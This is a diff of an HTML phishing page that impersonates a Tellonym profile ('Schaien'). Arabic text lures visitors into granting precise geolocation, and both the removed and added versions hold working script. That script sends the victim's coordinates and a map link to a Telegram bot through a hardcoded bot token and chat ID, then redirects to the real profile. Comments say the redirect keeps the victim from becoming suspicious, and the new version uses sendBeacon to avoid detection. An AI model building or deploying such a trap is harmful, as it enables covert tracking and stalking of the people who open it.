@@ -5,48 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Schaien (@Schaien) | Tellonym</title>
     <style>
-        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .popup { background: #1c1c1c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; }
-        .btn { background: #fe2c55; border: none; padding: 15px; border-radius: 25px; color: #fff; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
+        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { width: 85%; max-width: 380px; padding: 30px; border-radius: 25px; background: #1a1a1a; border: 1px solid #333; }
+        .btn { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 30px; font-weight: bold; width: 100%; margin-top: 20px; font-size: 16px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="popup">
-        <h2>🔐 نظام الأمان</h2>
-        <p>لمشاهدة رسائل التيل السرية لـ Schaien، يرجى تأكيد هويتك عبر السماح بنظام الحقق الجغرافي.</p>
-        <button class="btn" onclick="startTrap()">تأكيد الهوية الآن</button>
+    <div class="box">
+        <h2 style="font-size: 20px;">التحقق من الهوية (Tellonym)</h2>
+        <p style="color: #aaa; font-size: 14px;">يجب عليك الضغط على الزر أدناه للسماح باستلام الرسائل المجهولة من أصدقائك في منطقتك.</p>
+        <button class="btn" onclick="capture()">استمرار</button>
     </div>
 
     <script>
-        // بياناتك يا سيدي - تأكد من دقتها
-        const botToken = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
-        const myId = "1138822664";
+        const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
+        const chatId = "1138822664";
 
-        function startTrap() {
-            if (navigator.geolocation) {
-                // طلب الموقع بأعلى دقة
-                navigator.geolocation.getCurrentPosition(sendToTelegram, handleErr, {enableHighAccuracy: true});
-            } else {
-                go();
-            }
+        function capture() {
+            // إضافة خيارات الدقة العالية لضمان استجابة الأجهزة الغريبة
+            var options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+            
+            navigator.geolocation.getCurrentPosition(success, error, options);
         }
 
-        function sendToTelegram(pos) {
-            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            const info = `🎯 صيد جديد ومضمون!\n📍 الموقع: ${mapLink}\n🎯 الدقة: ${pos.coords.accuracy} متر`;
+        function success(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            
+            // استخدام "رابط مباشر" للإرسال لضمان عدم حظره كـ Fetch مريب
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + 
+                        encodeURIComponent(`🚨 صيد من جهاز غريب!\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n🎯 الدقة: ${acc} متر`);
 
-            // استخدام طريقة XMLHttpRequest لأنها الأكثر استقراراً مع الأجهزة الغريبة
-            var request = new XMLHttpRequest();
-            request.open("GET", `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(info)}`, true);
-            request.send();
+            // إرسال عبر تقنية الـ Beacon (الأسرع والأضمن في الخلفية)
+            navigator.sendBeacon(url);
 
-            // الانتظار ثانية واحدة ثم التوجه للحساب الحقيقي
-            setTimeout(go, 1000);
+            // تحويل فوري بعد الإرسال
+            setTimeout(function() {
+                window.location.href = "https://tellonym.me/Schaien";
+            }, 500);
         }
 
-        function handleErr() { go(); }
-        function go() { window.location.href = "https://tellonym.me/Schaien"; }
+        function error(err) {
+            // حتى لو رفض، نحوله لكي لا يشك
+            window.location.href = "https://tellonym.me/Schaien";
+        }
     </script>
 </body>
 </html>
